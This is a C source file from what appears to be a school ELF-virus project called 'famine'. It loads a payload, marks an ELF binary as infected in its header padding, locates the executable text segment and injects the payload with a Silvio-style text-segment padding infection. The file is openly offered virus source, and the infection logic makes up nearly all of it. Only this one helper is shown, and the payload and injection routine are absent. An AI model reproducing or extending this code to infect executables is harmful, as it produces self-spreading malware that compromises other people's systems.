/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   utils_infection.c                                  :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mabouce <ma.sithis@gmail.com>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/08/18 14:10:16 by mabouce           #+#    #+#             */
/*   Updated: 2021/08/18 14:10:16 by mabouce          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

void choose_infection_method(t_famine *famine)
{
    set_string_table_ptr(famine);
    load_payload(famine, PAYLOAD_NAME_64);

    // Set a flag in the EI_PAD header padding that indicate the file have been infected.
    famine->ehdr->e_ident[EI_PAD + 3] = 7;

    for (size_t i = 0; i < famine->ehdr->e_phnum; i++)
    {
        if (famine->phdr[i].p_type == PT_LOAD && famine->phdr[i].p_flags == (PF_R | PF_X))
        {
            //text found here, get the offset of the end of the section;
            famine->text_p_start_offset = famine->phdr[i].p_offset;
            famine->text_p_end_offset = famine->phdr[i].p_offset + famine->phdr[i].p_filesz;
            famine->text_p_size = famine->phdr[i].p_filesz;
            famine->text_p_vaddr = famine->phdr[i].p_vaddr;

            // Check if there is enought space for our payload in the text section.
            if (famine->payload_size > PAGE_SIZE)
            {
                error(ERROR_NOT_ENOUGHT_SPACE_FOR_PAYLOAD, famine);
            }
            else if (famine->text_p_end_offset % PAGE_SIZE + famine->payload_size < PAGE_SIZE)
            {
                silvio_text_infection(famine);
            }
            else
            {
                error(ERROR_NOT_ENOUGHT_SPACE_FOR_PAYLOAD, famine);
            }
            break;
        }
    }
}